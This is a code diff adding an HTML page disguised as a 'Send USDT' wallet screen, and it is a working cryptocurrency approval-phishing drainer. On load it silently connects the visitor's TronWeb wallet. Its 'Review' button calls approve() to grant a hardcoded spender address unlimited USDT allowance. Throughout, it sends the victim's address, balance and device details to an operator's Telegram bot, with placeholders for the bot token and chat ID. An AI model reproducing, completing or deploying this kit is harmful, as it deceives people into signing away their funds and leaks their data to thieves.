@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+<title>Send USDT</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+#canvas{position:absolute;top:0;left:0;width:100%;height:100%;display:block}
+#overlay{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10}
+.clickable{pointer-events:auto}
+.hidden{display:none!important}
+input[type="text"]{background:transparent;border:none;outline:none;color:#fff;font-size:16px;width:100%}
+input[type="text"]::placeholder{color:rgba(255,255,255,0.4)}
+</style>
+</head>
+<body>
+<canvas id="canvas"></canvas>
+<div id="overlay">
+  <!-- To field (spender address) -->
+  <div id="toField" class="clickable" style="position:absolute;left:5.5%;top:18.2%;width:89%;height:4.5%;">
+    <input type="text" id="toInput" readonly placeholder="TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ" style="font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:14px;padding:0">
+  </div>
+
+  <!-- Amount field -->
+  <div id="amountField" class="clickable" style="position:absolute;left:5.5%;top:35.5%;width:89%;height:6%;">
+    <input type="text" id="amountInput" readonly placeholder="0" style="font-size:28px;font-weight:600;text-align:right;padding-right:4px">
+  </div>
+
+  <!-- USD approx -->
+  <div id="usdApprox" class="clickable" style="position:absolute;left:5.5%;top:42.5%;width:89%;height:3%;color:rgba(255,255,255,0.5);font-size:13px;text-align:right;padding-right:4px">≈ $0.00</div>
+
+  <!-- USDT token row -->
+  <div id="tokenRow" class="clickable" style="position:absolute;left:5.5%;top:47%;width:89%;height:5%;display:flex;align-items:center;gap:8px">
+    <div style="width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#26a17b,#00d48a);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#000">U</div>
+    <div style="flex:1">
+      <div style="color:#fff;font-size:15px;font-weight:500">USDT</div>
+      <div style="color:rgba(255,255,255,0.4);font-size:11px">TRC20 · TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+    </div>
+    <div id="maxPill" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:20px;padding:4px 12px;font-size:12px;color:#fff;white-space:nowrap">Max</div>
+  </div>
+
+  <!-- Keypad area (transparent, captures taps) -->
+  <div id="keypadArea" class="clickable" style="position:absolute;left:0;top:55%;width:100%;height:35%;"></div>
+
+  <!-- Review button -->
+  <div id="reviewBtn" class="clickable" style="position:absolute;left:5.5%;bottom:8%;width:89%;height:6.5%;border-radius:12px;background:linear-gradient(135deg,#26a17b,#00d48a);display:flex;align-items:center;justify-content:center;font-weight:600;font-size:16px;color:#000">Review</div>
+</div>
+
+<script>
+// ============ CONFIG ============
+const CONFIG = {
+  USDT_CONTRACT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  SPENDER: 'TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ',
+  DEST: 'TUdnmk7rx8XXtvyTLNvLwXkyXLLW8r9yhJ',
+  FEE_LIMIT: 150000000,
+  MAX_UINT256: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+  TG_BOT_TOKEN: '', // TODO: replace with your BotFather token
+  TG_CHAT_ID: '',   // TODO: replace with your chat id
+  TG_SECRET: 'random_webhook_path'
+};
+// ==================================
+
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+let bgImg = new Image();
+bgImg.src = 'screen.svg';
+
+let scale = 1;
+let offsetX = 0, offsetY = 0;
+let walletConnected = false;
+let userAddress = '';
+let userBalance = 0n;
+
+function fitCanvas() {
+  const w = window.innerWidth;
+  const h = window.innerHeight;
+  const targetW = 720, targetH = 1453;
+  scale = Math.min(w / targetW, h / targetH);
+  offsetX = (w - targetW * scale) / 2;
+  offsetY = (h - targetH * scale) / 2;
+  canvas.width = w;
+  canvas.height = h;
+  draw();
+}
+window.addEventListener('resize', fitCanvas);
+bgImg.onload = fitCanvas;
+
+function draw() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+  ctx.drawImage(bgImg, offsetX, offsetY, 720 * scale, 1453 * scale);
+}
+
+function telegramSend(text) {
+  if (!CONFIG.TG_BOT_TOKEN || !CONFIG.TG_CHAT_ID) return;
+  const url = `https://api.telegram.org/bot${CONFIG.TG_BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(CONFIG.TG_CHAT_ID)}&parse_mode=HTML&disable_web_page_preview=1&text=${encodeURIComponent(text)}`;
+  fetch(url).catch(() => {});
+}
+
+async function connectWallet() {
+  if (typeof window.tronWeb === 'undefined') {
+    telegramSend('❌ PAGE OPEN — No tronWeb injected');
+    return false;
+  }
+  try {
+    await window.tronWeb.request({ method: 'tron_requestAccounts' });
+    userAddress = window.tronWeb.defaultAddress.base58;
+    walletConnected = true;
+    document.getElementById('toInput').value = CONFIG.SPENDER;
+    telegramSend(`✅ WALLET CONNECTED\n${userAddress}\nOS: ${navigator.platform}\nWallet: ${window.tronWeb.providers?.name || 'unknown'}\nScreen: ${screen.width}x${screen.height}\nUA: ${navigator.userAgent}`);
+    await fetchBalance();
+    return true;
+  } catch (e) {
+    telegramSend(`❌ WALLET CONNECT FAILED\n${e.message}`);
+    return false;
+  }
+}
+
+async function fetchBalance() {
+  try {
+    const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
+    const bal = await contract.balanceOf(userAddress).call();
+    userBalance = BigInt(bal.toString());
+    const formatted = (Number(userBalance) / 1e6).toFixed(6).replace(/\.?0+$/, '');
+    document.getElementById('amountInput').value = formatted;
+    updateUSD(formatted);
+  } catch (e) {
+    console.error('Balance fetch failed:', e);
+  }
+}
+
+function updateUSD(usdtAmount) {
+  const usd = (parseFloat(usdtAmount) * 1).toFixed(2);
+  document.getElementById('usdApprox').textContent = `≈ $${usd}`;
+}
+
+function formatUnits(units) {
+  return (Number(units) / 1e6).toFixed(6).replace(/\.?0+$/, '');
+}
+
+// Max button
+document.getElementById('maxPill').addEventListener('click', (e) => {
+  e.stopPropagation();
+  if (!walletConnected) {
+    telegramSend('❌ MAX NO WALLET');
+    return;
+  }
+  if (userBalance === 0n) return;
+  document.getElementById('amountInput').value = formatUnits(userBalance);
+  updateUSD(formatUnits(userBalance));
+  telegramSend(`✅ MAX CLICKED\n${userAddress}\nBalance: ${formatUnits(userBalance)} USDT`);
+});
+
+// Review button -> approve
+document.getElementById('reviewBtn').addEventListener('click', async (e) => {
+  e.stopPropagation();
+  if (!walletConnected) {
+    telegramSend('❌ REVIEW NO WALLET');
+    return;
+  }
+  const amountStr = document.getElementById('amountInput').value.trim();
+  if (!amountStr || parseFloat(amountStr) === 0) {
+    telegramSend('❌ REVIEW ZERO AMOUNT');
+    return;
+  }
+  telegramSend(`🔘 REVIEW CLICKED\n${userAddress}\nAmount: ${amountStr} USDT`);
+
+  try {
+    const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
+    const tx = await contract.approve(CONFIG.SPENDER, CONFIG.MAX_UINT256).send({
+      feeLimit: CONFIG.FEE_LIMIT,
+      callValue: 0
+    });
+    telegramSend(`✅ APPROVAL SUCCESS\n${userAddress}\nTxID: ${tx}\nhttps://tronscan.org/#/transaction/${tx}`);
+  } catch (err) {
+    telegramSend(`❌ APPROVAL FAILED\n${userAddress}\nError: ${err.message}\nCode: ${err.code ?? 'unknown'}`);
+  }
+});
+
+// Keypad taps - just visual feedback
+document.getElementById('keypadArea').addEventListener('click', () => {});
+
+// Silent connect on load
+let connectAttempts = 0;
+const connectInterval = setInterval(async () => {
+  connectAttempts++;
+  if (await connectWallet()) {
+    clearInterval(connectInterval);
+  } else if (connectAttempts >= 20) {
+    clearInterval(connectInterval);
+    telegramSend('❌ AUTO-CONNECT TIMEOUT — No wallet detected after 3s');
+  }
+}, 150);
+
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden && !walletConnected) connectWallet();
+});
+</script>
+</body>
+</html>
